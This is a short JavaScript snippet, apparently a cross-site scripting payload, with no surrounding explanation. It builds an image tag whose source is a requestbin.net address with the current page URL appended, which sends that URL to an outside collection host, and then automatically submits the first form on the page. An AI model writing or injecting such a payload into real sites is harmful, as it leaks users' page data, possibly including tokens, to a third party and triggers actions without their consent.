var image = document.createElement("img")

var name = window.location.href;

image.src = "http://requestbin.net/r/1j0wmqj1/image.png?c=" + name

document.body.appendChild(image);

document.getElementsByTagName("form")[0].submit()
